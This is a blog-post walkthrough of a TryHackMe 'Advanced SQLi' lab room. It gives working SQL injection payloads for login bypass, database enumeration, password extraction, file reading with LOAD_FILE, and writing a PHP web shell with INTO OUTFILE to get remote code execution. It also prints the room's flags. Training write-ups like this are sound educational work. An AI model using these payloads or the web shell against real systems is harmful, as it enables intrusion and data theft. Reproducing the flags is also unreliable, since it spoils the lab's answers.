---
layout: ../../layouts/BlogLayout.astro
title: "Advanced SQLi — A TryHackMe Room Write-up"
date: "JUL 10, 2025"
readTime: "6 MIN READ"
author: "Creepus"
category: "cyber"
image: "/assets/images/advanced-sqli/1.webp"
---
 
Welcome to the official write-up for the "Advanced SQLi" TryHackMe room! This guide walks you through each task, explaining the concepts and providing step-by-step instructions to exploit SQL Injection vulnerabilities — from basic bypasses to achieving Remote Code Execution.
 
Throughout this write-up, `MACHINE_IP` refers to the IP address of your deployed TryHackMe machine.
 
---
 
## Task 1: Classics — Mastering the Foundations of SQL Injection
 
This task focuses on classic SQL Injection methods to bypass authentication, preparing us for more advanced scenarios.
 
### Challenge 1: The Classic Entry Point
 
**Goal:** Bypass the login page and get generic access.
 
Navigate to the vulnerable login page at `http://MACHINE_IP` and enter the following:
 
- **Username:** `' OR 1=1-- -`
- **Password:** Any input (e.g., `test`) or leave blank
If successful, the page displays the first flag:
 
```
FLAG{LoginBypassWorking}
```
 
### Challenge 2: The Social Link & Targeted Bypass
 
**Goal:** Discover the administrator's username and bypass login specifically as that admin.
 
**Part 1 — Discover the Admin Username**
 
The intel suggests the admin's GitHub username is `bread-pitt-bot`. Visit their GitHub page to find the system username — it's `fightclub`.
 
**Part 2 — Bypass with the Admin Username**
 
Return to the login page and enter:
 
- **Username:** `fightclub'-- -`
- **Password:** Any input
If successful:
 
```
FLAG{AdminPasswordRetrieved}
```
 
---
 
## Task 2: Beyond the Horizon — Extracting Database Secrets
 
In this task, we go beyond simple login bypass to systematically extract information from the database.
 
### Module 2: Database Footprinting
 
**Goal:** Determine the number of columns in the query and identify the current database name.
 
Use `ORDER BY` in the username field, incrementing the number until an error occurs. Once you know the column count (assume it's 1), use this payload to find the database name:
 
```sql
admin' UNION SELECT database()-- -
```
 
### Module 3: Schema Mapping
 
**Goal:** Find table and column names.
 
Enumerate tables:
 
```sql
admin' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'your_database_name'-- -
```
 
Enumerate columns from the `users` table:
 
```sql
admin' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'your_database_name' AND table_name = 'users'-- -
```
 
### Module 4: The Final Extraction & Legitimate Access
 
**Goal:** Extract the admin's password and log in with valid credentials.
 
Exfiltrate the password:
 
```sql
admin' UNION SELECT password FROM users WHERE username = 'admin'-- -
```
 
Note the password, then log in legitimately. Press `Ctrl+A` if the flag isn't immediately visible.
 
```
FLAG{LegitAdminAccess}
```
 
> **Bonus Tip:** The password can also be found on the `bread-pitt-bot` GitHub account with simple decryption.
 
---
 
## Task 3: Unauthorized File Access — The Hidden Data
 
This task covers using SQL Injection to read files directly from the server's filesystem.
 
### Module 1: Identifying the New Vulnerability
 
**Goal:** Find a new SQLi vulnerability on a product page and map its query.
 
Locate the product page at `http://MACHINE_IP/product.php?id=1`. Confirm it's vulnerable and find the column count using `ORDER BY`. Identify displayable columns:
 
```
-1' UNION SELECT 1,2,3-- -
```
 
### Module 2: File System Interaction via SQLi
 
**Goal:** Understand `LOAD_FILE()` and find the path to the hidden flag file.
 
Find the absolute path of `flag.txt` by loading known files like `/var/www/html/server_notes.txt` or browsing to `http://MACHINE_IP/secret_notes.txt`.
 
### Module 3: The Final Extraction
 
**Goal:** Read the `flag.txt` file.
 
```
http://MACHINE_IP/product.php?id=-1' UNION SELECT 1, LOAD_FILE('/var/www/html/flag.txt'), 3-- -
```
 
```
FLAG{FileReadSQLiSuccess}
```
 
---
 
## Task 4: The Ultimate Control — Remote Code Execution (RCE)
 
The final challenge: escalate SQL Injection to gain RCE by writing a malicious web shell to the server.
 
### Module 2: Identifying the Attack Vector & Crafting the Shell
 
**Goal:** Understand the RCE attack vector and prepare a web shell.
 
The attack vector is the same vulnerable `product.php` page. The web shell:
 
```php
<?php system($_GET["cmd"]); ?>
```
 
### Module 3: Deploying the Web Shell (INTO OUTFILE)
 
**Goal:** Use SQL Injection to write your web shell to a web-accessible directory.
 
Target directory: `/var/www/html/uploads/`
 
```
http://MACHINE_IP/product.php?id=-1' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/uploads/shell.php'-- -
```
 
### Module 4: Gaining Control & Flag Retrieval
 
**Goal:** Access your web shell, confirm RCE, and find the final flag.
 
Access the shell at `http://MACHINE_IP/uploads/shell.php` and execute commands via the `cmd` parameter:
 
```
?cmd=cat finalFlag.txt
```
 
```
FLAG{RCE_Master}
```
 
---
 
## Task 5: Conclusion & What's Next?
 
Congratulations on completing the "Advanced SQLi" room! Keep learning, keep hacking, and always stay ethical!